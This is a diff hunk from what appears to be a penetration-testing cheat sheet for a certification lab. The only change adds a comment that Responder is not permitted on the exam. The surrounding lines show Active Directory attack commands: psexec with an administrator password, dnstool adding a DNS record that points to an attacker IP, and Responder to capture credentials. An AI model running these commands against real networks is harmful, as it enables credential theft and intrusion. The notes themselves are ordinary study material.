@@ -393,8 +393,8 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 ```shell
 # add AD Integrated DNS records
 python3 dnstool.py -u '<domain>\<username>' -p <password> <target ip> -a add -r <TARGETRECORD> -d <attacker ip> -t A
-# get information in a few minutes
-responder -I tun0
+# get information in a few minutes 
+responder -I tun0 # not allowed in the labs or on the exam
 ```
 
 ### :open_file_folder: Extracting
